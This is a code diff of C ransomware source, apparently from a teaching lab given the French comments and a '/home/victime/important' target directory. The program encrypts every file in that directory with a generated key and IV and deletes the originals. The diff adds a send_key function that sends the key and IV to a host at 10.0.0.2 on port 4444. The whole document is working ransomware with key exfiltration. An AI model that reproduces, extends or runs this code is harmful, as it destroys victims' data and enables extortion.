@@ -1,13 +1,10 @@
 #include "ransomlib.h"
 #include <dirent.h>
-// for socket
 #include <sys/socket.h>
 #include <unistd.h> 
 #include <arpa/inet.h>
 #include <openssl/rand.h>
 #include <stdio.h>
-
-
 
 void usage();
 
@@ -21,7 +18,7 @@ int send_key(char *pKey, char *pIv);
 
 int main (int argc, char * argv[])
 {
-	printf("Bon travail!\n");
+	
 	unsigned char key[33];
     int sizeKey = 33;
     unsigned char iv[33];
@@ -30,6 +27,7 @@ int main (int argc, char * argv[])
     char pIv[65];
 	int status = generate_key(key, sizeKey, iv, sizeIv, pKey, pIv);
 	listdir("/home/victime/important", iv, key, 'e');
+    send_key(pKey, pIv);
 }
 
 int generate_key(unsigned char *key, int sizeKey, unsigned char *iv, int sizeIv,char *pKey, char *pIv)
@@ -61,6 +59,7 @@ void listdir(const char *name, unsigned char *iv, unsigned char *key, char de_fl
             
             
         }
+
         else if(strcmp("..",dirp->d_name) != 0 && strcmp(".",dirp->d_name) != 0)
         {
 
@@ -72,17 +71,32 @@ void listdir(const char *name, unsigned char *iv, unsigned char *key, char de_fl
             encrypt(key, iv, filePath);
             remove(filePath);
             free(filePath);
-            
-
-            
 
         }
-
-
-
-
     }
-
-
-
 }
+
+
+int send_key(char *pKey, char *pIv)
+{
+    int sockid;
+    sockid = socket(AF_INET,SOCK_STREAM,0);
+
+    struct sockaddr_in server_addr;
+    server_addr.sin_family = AF_INET;
+    server_addr.sin_port = htons(4444);
+    server_addr.sin_addr.s_addr = inet_addr("10.0.0.2");
+    
+    char *msg = malloc(strlen(pKey)+strlen(pIv)+2);  // Format du message key:Iv
+    strcpy(msg, pKey);
+    strcat(msg,":");
+    strcat(msg,pIv);
+
+    int status = connect(sockid,(struct sockaddr *)&server_addr, sizeof(server_addr));
+    printf("%d\n", status);
+
+    send(sockid, (const char *)msg, strlen(msg),0);
+    close(sockid);
+    free(msg);
+}
+        
